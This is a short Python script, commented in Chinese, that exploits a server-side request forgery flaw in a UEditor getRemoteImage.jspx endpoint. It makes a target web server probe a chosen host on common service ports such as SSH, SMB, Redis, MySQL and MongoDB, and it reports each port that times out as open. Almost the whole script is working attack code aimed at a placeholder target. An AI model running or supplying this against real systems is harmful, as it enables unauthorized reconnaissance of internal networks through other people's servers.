# -*- coding-utf-8 -*-
import requests

# 端口扫描函数
def portscan(url, rurl):
    # 要测试的端口列表，可以根据需求添加或更改
    ports = [21, 22, 23, 25, 80, 443, 445, 873, 1080, 1099, 1090, 1521, 3306, 6379, 27017]
    for port in ports:
        try:
            # 构造测试URL
            test_url = f"{url}/ueditor/getRemoteImage.jspx?upfile={rurl}:{port}"
            # 发送HTTP请求
            response = requests.get(test_url, timeout=6)
        except:
            # 超过6秒没有响应，认为端口是开放的
            print(f'[+]{port} is open')

if __name__ == '__main__':
    # 调用端口扫描函数
    portscan('http://www.target.com', 'www.google.com')